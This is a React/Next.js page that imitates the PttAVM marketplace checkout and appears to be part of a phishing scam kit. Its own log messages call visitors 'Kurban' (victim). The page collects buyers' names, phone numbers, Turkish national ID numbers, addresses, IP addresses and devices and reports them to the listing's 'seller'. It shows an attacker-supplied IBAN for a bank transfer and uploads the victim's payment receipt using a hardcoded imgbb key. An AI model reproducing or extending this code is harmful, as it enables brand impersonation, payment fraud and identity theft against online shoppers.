'use client';

import { useState, useEffect, useRef } from 'react';
import { useParams, useRouter } from 'next/navigation';

export default function PttAVMTemplate() {
    const { idOrSlug } = useParams();
    const router = useRouter();
    
    const [mevcutAdim, setMevcutAdim] = useState(1);
    const [data, setData] = useState<any>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(false);
    
    const [form, setForm] = useState({
        aliciAd: '',
        aliciSoyad: '',
        aliciTel: '',
        aliciIl: '',
        aliciIlce: '',
        aliciMahalle: '',
        aliciTC: '',
        aliciAdres: ''
    });
    
    const [turkeyData, setTurkeyData] = useState<any[]>([]);
    const [secilenDekontDosyasi, setSecilenDekontDosyasi] = useState<File | null>(null);
    const [isProcessing, setIsProcessing] = useState(false);
    const [isCompleted, setIsCompleted] = useState(false);
    const [openAccordions, setOpenAccordions] = useState<string[]>([]);
    
    const fileInputRef = useRef<HTMLInputElement>(null);

    useEffect(() => {
        fetchIlan();
        fetchTurkeyData();
    }, [idOrSlug]);

    const fetchIlan = async () => {
        try {
            const res = await fetch(`/api/ilan/${idOrSlug}`);
            if (res.ok) {
                const ilanData = await res.json();
                setData(ilanData);
                logAction("İlana Giriş Yaptı", "Kurban vitrini inceliyor.", ilanData);
                setLoading(false);
            } else {
                setError(true);
                setLoading(false);
            }
        } catch (e) {
            setError(true);
            setLoading(false);
        }
    };

    const fetchTurkeyData = async () => {
        try {
            const response = await fetch("https://turkiyeapi.dev/api/v1/provinces");
            const json = await response.json();
            const sorted = json.data.sort((a: any, b: any) => a.name.localeCompare(b.name));
            setTurkeyData(sorted);
        } catch (error) {}
    };

    const logAction = async (aksiyon: string, detay: string = "", ilanData: any = data) => {
        if (!ilanData) return;
        try {
            let ip = "Bilinmiyor";
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                ip = ipData.ip;
            } catch (e) {}

            const ua = navigator.userAgent;
            let cihaz = "Diğer/PC";
            if (/iPhone|iPad|iPod/i.test(ua)) cihaz = "Apple iOS";
            else if (/Android/i.test(ua)) cihaz = "Android";

            await fetch(`/api/log-ekle`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    saticiId: ilanData.olusturanMusteri,
                    ilanBasligi: ilanData.urunAdi || "Bilinmiyor",
                    saticiAdi: ilanData.saticiAdi || "Bilinmiyor",
                    fiyat: (ilanData.fiyat || 0) + " TL",
                    sablon: "Şablon 2 (PttAVM)",
                    aksiyon,
                    detay,
                    ip,
                    cihaz,
                    tarih: new Date().toLocaleDateString('tr-TR'),
                    saat: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
                })
            });
        } catch (e) {}
    };

    const formatPrice = (num: number, kusurat = false) => {
        return new Intl.NumberFormat('tr-TR', { 
            minimumFractionDigits: kusurat ? 2 : 0, 
            maximumFractionDigits: kusurat ? 2 : 0 
        }).format(num);
    };

    const handleNext = async () => {
        if (mevcutAdim === 1) {
            setMevcutAdim(2);
            logAction("Sepete Girdi (Hemen Al)", "Sipariş özetine geçti.");
        } else if (mevcutAdim === 2) {
            setMevcutAdim(3);
            logAction("Ürünleri Kontrol Etti", "Teslimat adres formuna geçti.");
        } else if (mevcutAdim === 3) {
            if (!form.aliciAd || !form.aliciSoyad || !form.aliciTel || !form.aliciIl || !form.aliciIlce || !form.aliciMahalle || !form.aliciTC || !form.aliciAdres) {
                alert("Lütfen teslimat bilgilerini eksiksiz doldurun.");
                return;
            }
            setMevcutAdim(4);
            logAction("Adresi Kaydetti", `Ödeme Bekleniyor. Şehir: ${form.aliciIl}/${form.aliciIlce}, İsim: ${form.aliciAd} ${form.aliciSoyad}`);
        } else if (mevcutAdim === 4) {
            if (!secilenDekontDosyasi) {
                alert("Lütfen ödeme dekontunuzu seçin.");
                return;
            }
            handleCompleteOrder();
        }
        window.scrollTo(0, 0);
    };

    const handleCompleteOrder = async () => {
        setIsProcessing(true);
        try {
            const apiKey = "De087c486b0f12c525ef31688d64dcf0";
            const formData = new FormData();
            formData.append("image", secilenDekontDosyasi!);
            
            const imgRes = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, { method: "POST", body: formData });
            const imgData = await imgRes.json();
            
            if (!imgData.success) throw new Error("Dekont yüklenemedi.");
            
            const dekontUrl = imgData.data.url;
            const tamAdres = `${form.aliciIl} / ${form.aliciIlce} - ${form.aliciMahalle} - ${form.aliciAdres}`;

            const res = await fetch('/api/siparis-tamamla', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ilanId: data.docId || idOrSlug,
                    saticiId: data.olusturanMusteri,
                    ilanBasligi: data.urunAdi,
                    aliciAd: `${form.aliciAd} ${form.aliciSoyad}`,
                    aliciTel: form.aliciTel,
                    aliciAdres: tamAdres,
                    dekontUrl
                })
            });

            if (res.ok) {
                logAction("BAŞARILI BİTİŞ", "Kurban dekontu yükledi ve Şablon 2'de siparişi tamamladı.");
                setIsCompleted(true);
            } else {
                throw new Error("Sipariş işlenemedi.");
            }
        } catch (e: any) {
            alert(e.message || "Bir hata oluştu.");
        } finally {
            setIsProcessing(false);
        }
    };

    const toggleAccordion = (id: string) => {
        setOpenAccordions(prev => prev.includes(id) ? prev.filter(a => a !== id) : [...prev, id]);
    };

    if (loading) return (
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', fontFamily: 'sans-serif', background: '#f5f5f5' }}>
            Yükleniyor...
        </div>
    );

    if (error) return (
        <div className="ptt-body">
            <div className="shb-error-card">
                <div className="error-icon">
                    <svg viewBox="0 0 24 24"><path d="M11 15h2v2h-2zm0-8h2v6h-2zm.99-5C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"></path></svg>
                </div>
                <div className="error-title">İlan Yayında Değil</div>
                <div className="error-desc">Aradığınız ilan yayından kaldırılmış veya süresi dolmuş olabilir.</div>
                <a href="https://www.pttavm.com" className="error-btn">Ana Sayfaya Dön</a>
            </div>
        </div>
    );

    const safFiyat = parseFloat(data.fiyat) || 0;

    return (
        <div className="ptt-body">
            <style jsx global>{`
                :root {
                    --primary-yellow: #fcd55c; 
                    --primary-blue: #46b3cf; 
                    --price-green: #00a651;
                    --text-dark: #333333;
                    --text-gray: #666666;
                    --bg-color: #ffffff;
                    --border-color: #e0e0e0;
                }
                .ptt-body {
                    background-color: #f5f5f5;
                    color: var(--text-dark);
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    margin: 0;
                    padding: 0;
                }
                .app-container { width: 100%; max-width: 480px; background: var(--bg-color); min-height: 100vh; position: relative; }
                .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background-color: #fff; border-bottom: 1px solid #f0f0f0; }
                .logo-container { flex: 1; display: flex; justify-content: center; align-items: center; }
                .logo-container .logo-text { font-size: 22px; font-weight: 800; color: #0059a3; letter-spacing: -0.5px; }
                .logo-container .logo-text span { color: #fcd55c; }
                .search-section { padding: 10px 15px; background-color: #fff; border-bottom: 1px solid var(--border-color); }
                .search-box { display: flex; width: 100%; height: 42px; border: 1px solid #767676; border-radius: 4px; overflow: hidden; background: #fff; align-items: center;}
                .search-box input { flex: 1; border: none; padding: 0 15px; font-size: 14px; outline: none; }
                .gallery-wrap { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; background: #fff; scrollbar-width: none; }
                .gallery-wrap::-webkit-scrollbar { display: none; }
                .gallery-wrap img { width: 100%; height: 320px; flex-shrink: 0; object-fit: contain; scroll-snap-align: center; }
                .product-details { padding: 15px; background: #fff; border-bottom: 5px solid #f5f5f5; }
                .product-title { font-size: 18px; font-weight: 400; margin-bottom: 5px; line-height: 1.3; }
                .product-price { font-size: 32px; font-weight: 700; color: var(--price-green); margin-bottom: 10px; }
                .badge-kargo { display: inline-flex; align-items: center; gap: 5px; background-color: #e0f2f5; color: #008c99; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 15px; }
                .accordion-header { display: flex; justify-content: space-between; align-items: center; padding: 18px 15px; font-size: 16px; font-weight: 600; cursor: pointer; border-bottom: 1px solid #eee; }
                .accordion-body { padding: 15px; display: none; font-size: 14px; color: var(--text-gray); line-height: 1.6; }
                .accordion-body.active { display: block; }
                .ozellik-table { width: 100%; border-collapse: collapse; }
                .ozellik-table td { padding: 10px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
                .ozellik-table td:first-child { color: var(--text-dark); width: 40%; }
                
                .sticky-bottom { position: fixed; bottom: 0; width: 100%; max-width: 480px; background: #fff; padding: 12px 15px; display: flex; align-items: center; gap: 15px; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); z-index: 100; border-top: 1px solid #eee; }
                .btn-hmn { flex: 1; background: #0059a3; color: white; border: none; height: 50px; border-radius: 6px; font-size: 16px; font-weight: 700; cursor: pointer; }
                .btn-hmn:disabled { background: #ccc; }

                /* Checkout */
                .checkout-header { text-align: center; padding: 15px; background: #fff; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 10; }
                .form-group { margin-bottom: 15px; padding: 0 15px; }
                .form-group label { display: block; font-size: 13px; color: #666; margin-bottom: 5px; }
                .form-group input, .form-group select, .form-group textarea { width: 100%; height: 45px; border: 1px solid #ddd; border-radius: 4px; padding: 0 12px; font-size: 15px; }
                .form-group textarea { height: 100px; padding: 12px; }
                
                .summary-card { background: #fff; margin: 15px; border-radius: 8px; border: 1px solid #eee; overflow: hidden; }
                .summary-item { display: flex; gap: 15px; padding: 15px; border-bottom: 1px solid #eee; }
                .summary-item img { width: 60px; height: 60px; object-fit: cover; border-radius: 4px; }
                .summary-totals { padding: 15px; background: #fafafa; }
                .summary-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
                .summary-row.total { font-weight: bold; font-size: 16px; border-top: 1px solid #ddd; padding-top: 10px; margin-top: 5px; }
                
                .iban-box { background: #f1f8ff; border: 1px solid #cce5ff; padding: 15px; margin: 15px; border-radius: 8px; }
                .upload-box { border: 2px dashed #0059a3; padding: 30px; text-align: center; margin: 15px; border-radius: 8px; background: #fafafa; cursor: pointer; color: #0059a3; font-weight: 600; }
                
                .shb-error-card { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 60px 20px; text-align: center; background: #fff; margin: 20px auto; max-width: 440px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid var(--border-color); }
                .error-icon svg { width: 35px; height: 35px; fill: #999; }
                .error-title { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
                .error-desc { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }
                .error-btn { background: #0059a3; color: #fff; text-decoration: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; font-size: 14px; }
            `}</style>

            <div className="app-container">
                {isCompleted ? (
                    <div style={{ textAlign: 'center', padding: '60px 20px', background: '#fff' }}>
                        <svg viewBox="0 0 24 24" style={{ width: '64px', height: '64px', stroke: '#00a651', fill: 'none', marginBottom: '15px' }} strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                        <h2 style={{ color: '#00a651', marginBottom: '10px' }}>Siparişiniz Alındı!</h2>
                        <p style={{ color: '#555', fontSize: '14px', lineHeight: '1.6' }}>Ödemeniz ve dekontunuz başarıyla satıcıya iletilmiştir. Sipariş durumunu satıcı mağazadan takip edebilirsiniz.</p>
                    </div>
                ) : (
                    <>
                        {mevcutAdim === 1 ? (
                            <>
                                <div className="header">
                                    <div className="logo-container">
                                        <div className="logo-text">Ptt<span>AVM</span></div>
                                    </div>
                                    <div className="cart-btn">
                                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z"></path><path d="M3 6h18"></path><path d="M16 10a4 4 0 0 1-8 0"></path></svg>
                                        <span className="cart-badge">1</span>
                                    </div>
                                </div>
                                <div className="search-section">
                                    <div className="search-box">
                                        <input type="text" placeholder="Ürün, kategori veya marka ara" readOnly />
                                        <button><svg viewBox="0 0 24 24" stroke="currentColor"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></button>
                                    </div>
                                </div>
                                <div id="step1">
                                    <div className="gallery-wrap">
                                        {(data.resimler && data.resimler.length > 0) ? 
                                            data.resimler.map((img: string, i: number) => <img key={i} src={img} alt="" />) : 
                                            <img src={data.anaResim} alt="" />
                                        }
                                    </div>
                                    <div className="product-details">
                                        <h1 className="product-title">{data.urunAdi}</h1>
                                        <div style={{ fontSize: '12px', color: '#666', marginBottom: '10px' }}>Satıcı: {data.saticiAdi}</div>
                                        <div className="product-price">{formatPrice(safFiyat)} TL</div>
                                        <div className="badge-kargo">
                                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="1" y="3" width="15" height="13" rx="1.5"></rect><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon><circle cx="5.5" cy="18.5" r="2.5"></circle><circle cx="18.5" cy="18.5" r="2.5"></circle></svg>
                                            Ücretsiz Kargo
                                        </div>
                                    </div>

                                    <div className="accordion-container">
                                        {[
                                            { id: 'ozellik', title: 'Ürün Özellikleri' },
                                            { id: 'aciklama', title: 'Ürün Açıklaması' },
                                            { id: 'teslimat', title: 'Teslimat ve İade' }
                                        ].map(acc => (
                                            <div key={acc.id} className="accordion-item">
                                                <div className="accordion-header" onClick={() => toggleAccordion(acc.id)}>
                                                    <span>{acc.title}</span>
                                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" style={{ transform: openAccordions.includes(acc.id) ? 'rotate(180deg)' : 'none', transition: '0.3s' }}><path d="M6 9l6 6 6-6"></path></svg>
                                                </div>
                                                <div className={`accordion-body ${openAccordions.includes(acc.id) ? 'active' : ''}`}>
                                                    {acc.id === 'ozellik' && (
                                                        <table className="ozellik-table">
                                                            <tbody>
                                                                {Array.isArray(data.dinamikOzellikler) && data.dinamikOzellikler.map((item: any, i: number) => (
                                                                    <tr key={i}><td>{item.anahtar}</td><td>{item.deger}</td></tr>
                                                                ))}
                                                            </tbody>
                                                        </table>
                                                    )}
                                                    {acc.id === 'aciklama' && (
                                                        <div dangerouslySetInnerHTML={{ __html: data.urunAciklamasi?.replace(/\n/g, '<br>') || "Açıklama yok." }} />
                                                    )}
                                                    {acc.id === 'teslimat' && (
                                                        <p>Bu ürün ücretsiz kargo ile gönderilir. Ürünü teslim aldıktan sonra 14 gün içinde iade edebilirsiniz.</p>
                                                    )}
                                                </div>
                                            </div>
                                        ))}
                                    </div>

                                    <div className="sticky-bottom">
                                        <div style={{ flex: 1 }}>
                                            <div style={{ fontSize: '12px', color: '#666' }}>Fiyat</div>
                                            <div style={{ fontSize: '18px', fontWeight: 'bold', color: 'var(--price-green)' }}>{formatPrice(safFiyat)} TL</div>
                                        </div>
                                        <button className="btn-hmn" onClick={handleNext}>Hemen Al</button>
                                    </div>
                                </div>
                            </>
                        ) : (
                            <>
                                <div className="checkout-header">
                                    <div className="logo-text">Ptt<span>AVM</span></div>
                                </div>
                                {mevcutAdim === 2 && (
                                    <div id="step2">
                                        <div style={{ padding: '20px 15px', fontSize: '18px', fontWeight: 'bold' }}>Sipariş Özeti</div>
                                        <div className="summary-card">
                                            <div className="summary-item">
                                                <img src={data.anaResim || (data.resimler && data.resimler[0])} alt="" />
                                                <div style={{ flex: 1 }}>
                                                    <div style={{ fontSize: '14px', marginBottom: '5px' }}>{data.urunAdi}</div>
                                                    <div style={{ fontWeight: 'bold' }}>{formatPrice(safFiyat)} TL</div>
                                                </div>
                                            </div>
                                            <div className="summary-totals">
                                                <div className="summary-row"><span>Ara Toplam</span><span>{formatPrice(safFiyat)} TL</span></div>
                                                <div className="summary-row"><span>Kargo</span><span style={{ color: 'var(--price-green)' }}>Ücretsiz</span></div>
                                                <div className="summary-row total"><span>Genel Toplam</span><span>{formatPrice(safFiyat)} TL</span></div>
                                            </div>
                                        </div>
                                        <div style={{ padding: '15px' }}>
                                            <button className="btn-hmn" style={{ width: '100%' }} onClick={handleNext}>Devam Et</button>
                                        </div>
                                    </div>
                                )}

                                {mevcutAdim === 3 && (
                                    <div id="step3">
                                        <div style={{ padding: '20px 15px', fontSize: '18px', fontWeight: 'bold' }}>Teslimat Bilgileri</div>
                                        <div className="form-group"><label>Ad</label><input type="text" value={form.aliciAd} onChange={e => setForm({...form, aliciAd: e.target.value})} /></div>
                                        <div className="form-group"><label>Soyad</label><input type="text" value={form.aliciSoyad} onChange={e => setForm({...form, aliciSoyad: e.target.value})} /></div>
                                        <div className="form-group"><label>Telefon</label><input type="tel" value={form.aliciTel} onChange={e => setForm({...form, aliciTel: e.target.value})} placeholder="05xx..." /></div>
                                        <div className="form-group"><label>TC Kimlik No</label><input type="number" value={form.aliciTC} onChange={e => setForm({...form, aliciTC: e.target.value})} /></div>
                                        <div className="form-group"><label>İl</label>
                                            <select value={form.aliciIl} onChange={e => setForm({...form, aliciIl: e.target.value, aliciIlce: ''})}>
                                                <option value=""></option>
                                                {turkeyData.map(il => <option key={il.id} value={il.name}>{il.name}</option>)}
                                            </select>
                                        </div>
                                        <div className="form-group"><label>İlçe</label>
                                            <select value={form.aliciIlce} onChange={e => setForm({...form, aliciIlce: e.target.value})} disabled={!form.aliciIl}>
                                                <option value=""></option>
                                                {form.aliciIl && turkeyData.find(il => il.name === form.aliciIl)?.districts.map((d: any) => <option key={d.id} value={d.name}>{d.name}</option>)}
                                            </select>
                                        </div>
                                        <div className="form-group"><label>Mahalle</label><input type="text" value={form.aliciMahalle} onChange={e => setForm({...form, aliciMahalle: e.target.value})} /></div>
                                        <div className="form-group"><label>Açık Adres</label><textarea value={form.aliciAdres} onChange={e => setForm({...form, aliciAdres: e.target.value})}></textarea></div>
                                        <div style={{ padding: '15px' }}>
                                            <button className="btn-hmn" style={{ width: '100%' }} onClick={handleNext}>Ödemeye Geç</button>
                                        </div>
                                    </div>
                                )}

                                {mevcutAdim === 4 && (
                                    <div id="step4">
                                        <div style={{ padding: '20px 15px', fontSize: '18px', fontWeight: 'bold' }}>Ödeme Yöntemi: Havale / EFT</div>
                                        <div className="iban-box">
                                            <div style={{ marginBottom: '15px' }}>
                                                <div style={{ fontSize: '12px', color: '#666' }}>Alıcı Ad Soyad</div>
                                                <div style={{ fontWeight: 'bold' }}>{data.iban?.split('-')[1]?.trim() || data.saticiAdi}</div>
                                            </div>
                                            <div>
                                                <div style={{ fontSize: '12px', color: '#666' }}>IBAN</div>
                                                <div style={{ fontWeight: 'bold', fontSize: '16px' }}>{data.iban?.split('-')[0].trim() || 'TR00...'}</div>
                                            </div>
                                        </div>
                                        <input type="file" ref={fileInputRef} style={{ display: 'none' }} onChange={e => e.target.files?.[0] && setSecilenDekontDosyasi(e.target.files[0])} />
                                        <div className="upload-box" onClick={() => fileInputRef.current?.click()} style={secilenDekontDosyasi ? { borderColor: '#00a651', color: '#00a651' } : {}}>
                                            {secilenDekontDosyasi ? `Dekont Seçildi: ${secilenDekontDosyasi.name}` : 'Ödeme Dekontunu Yükle'}
                                        </div>
                                        <div style={{ padding: '15px' }}>
                                            <button className="btn-hmn" style={{ width: '100%' }} onClick={handleNext} disabled={isProcessing}>
                                                {isProcessing ? 'İşleniyor...' : 'Siparişi Tamamla'}
                                            </button>
                                        </div>
                                    </div>
                                )}
                            </>
                        )}
                    </>
                )}
            </div>
        </div>
    );
}
